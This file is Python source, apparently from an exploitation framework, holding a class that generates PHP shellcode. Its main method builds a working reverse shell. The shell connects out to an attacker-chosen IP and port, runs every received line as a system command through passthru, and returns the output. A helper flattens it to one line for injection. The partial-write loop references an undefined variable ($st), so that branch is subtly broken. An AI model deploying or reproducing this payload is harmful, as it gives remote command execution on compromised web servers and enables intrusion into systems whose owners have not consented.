from shellcode import Shellcode


class PhpShellcodes(Shellcode):
    """
        Class with shellcodes for php language
    """

    def __init__(self, connectback_ip='localhost', connectback_port=5555):
        Shellcode.__init__(self, connectback_ip=connectback_ip, connectback_port=connectback_port)
        self.name = ""
        return

    def get_phpinfo(self, badchars):
        """ Function to get phpinfo """
        phpcode = "<?php phpinfo(); ?>"
        return phpcode

    def get_phpcode(self, localhost, localport):
        """ Function to get php shellcode """

        if not localhost or not localport:
            print "Settings for connectback listener must be defined"
            return False

        phpcode = ""
        phpcode += """
<?php
    $address="LOCALHOST";
    $port=LOCALPORT;
    $buff_size=2048;
    $timeout=120;

    $sock=fsockopen($address,$port) or die("Cannot create a socket");
    while ($read=fgets($sock,$buff_size)) {
        $out="";
        if ($read) {
            if (strcmp($read,"quit")===0 || strcmp($read,"q")===0) {
                break;
            }

            ob_start();
            passthru($read);
            $out=ob_get_contents();
            ob_end_clean();
        }

        $length=strlen($out);
        while (1) {
            $sent=fwrite($sock,$out,$length);
            if ($sent===false) {
                break;
            }

            if ($sent<$length) {
                $st=substr($st,$sent);
                $length-=$sent;
            } else {
                break;
            }
        }
    }
    fclose($sock);
?>
"""
        phpcode = phpcode.replace("LOCALHOST", str(localhost))
        phpcode = phpcode.replace("LOCALPORT", str(localport))
        return phpcode

    def get_php_code_inline(self, host, port):
        res = self.get_phpcode(host, port)
        res = res.replace('\n', '')
        res = res.replace('\r', '')
        return res

    def get_shellcode(self, inline=False):
        shell = self.get_phpcode(self.CONNECTBACK_IP, self.CONNECTBACK_PORT)
        if inline:
            shell = self.make_inline(shell)
        return shell
